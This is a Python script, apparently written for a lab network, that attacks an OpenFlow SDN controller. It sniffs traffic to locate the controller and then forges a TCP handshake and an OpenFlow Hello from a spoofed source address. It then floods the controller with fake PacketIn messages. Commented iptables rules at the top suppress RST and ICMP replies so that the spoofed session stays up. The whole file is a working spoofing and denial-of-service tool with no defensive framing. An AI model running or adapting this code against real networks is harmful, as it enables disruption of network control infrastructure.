#sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 192.168.56.5 -d 192.168.56.4 --dport 6653 -j DROP
#iptables -A OUTPUT -s 192.168.56.5 -d 192.168.56.4 -p ICMP --icmp-type port-unreachable -j DROP
from scapy.layers.inet import TCP, IP

try:
    import pyshark
except:
    print("Please install pyshark")
import re
import os
import json
from threading import Thread
import threading
import sys
from scapy.all import *
import random
import time
from scapy.contrib import openflow
from scapy.contrib.openflow import OpenFlow, OFPTHello, OFPTPacketIn

controller = []
def Capture_Packet(run_event):
    while run_event.is_set():
        try:

            cap = pyshark.LiveCapture(bpf_filter='tcp')
            cap.interfaces = ['VirtualBox Host-Only Network']
            cap.sniff(packet_count=200)
            packetProcess = Thread(target=Analyze_Packet, args=(cap,run_event,))
            packetProcess.start()
        except RuntimeError:
            pass



def Analyze_Packet(cap, run_event):
    for pkt in cap:
        if not run_event.is_set():
            break
        if not "OPENFLOW_V4" in str(pkt.layers):
            continue
        elif not str(pkt.openflow_v4.type)=="10":
            continue
        elif str(pkt.openflow_v4.type)=="10":
            IP = pkt.ip.dst
            Port = pkt.tcp.dstport
            srcIP = pkt.ip.src
            controller.extend((IP,Port,srcIP))
            print("IP of the controller is {}".format(IP))
            print("Port of the controller is {}".format(Port))
            run_event.clear()
            break
    return

def SendFakePackets(run_event):
    print("YoYoYo")
    if run_event.is_set():
        sport = random.randint(2000,65535)
        ip=IP(src="192.168.197.5",dst=controller[0])
        controller[2]=sport
        SYN=TCP(sport=sport,dport=int(controller[1]),flags='S',seq=0)
        SYNACK=sr1(ip/SYN)

        ACK=TCP(sport=sport, dport=int(controller[1]), flags='A', seq=1, ack=SYNACK.seq + 1)
        helloRecv=sr1(ip/ACK)


        helloHead = OFPTHello(version="OpenFlow 1.3",xid=10)
        TCPHead = TCP(sport=sport, dport=int(controller[1]), seq=2)
        helloPacket = ip/TCPHead/helloHead
        send(helloPacket)


def flood_packet_in(run_event):
    ip =  ip=IP(src="192.168.197.5",dst=controller[0])
    sequenceNo = random.randint(10, 10000000)
    start=0
    while run_event.is_set():
        if time.time() - start > 0.7:
            start = time.time()
            PacketInHead = OFPTPacketIn(version="OpenFlow 1.3",data=b'\x00\x01\x00\x08\x00\x00\x00~')
            TCPHead = TCP(sport=controller[2], dport=int(controller[1]), seq=sequenceNo+1)
            sequenceNo+=1
            PacketIn = ip/TCPHead/PacketInHead
            send(PacketIn)

if __name__ == "__main__":
    try:
        run_event = threading.Event()
        run_event.set()
        Capture_Packet(run_event)
        run_event.set()
        SendFakePackets(run_event)
        packetflood = Thread(target=flood_packet_in, args=(run_event,))
        #packetflood.daemon=True
        packetflood.start()
        while run_event.is_set():
            try:
                pass
            except KeyboardInterrupt:
                run_event.clear()
                print("Exiting Program")
                break
    except KeyboardInterrupt:
        print("Exiting Program")
        run_event.clear()
        sys.exit()
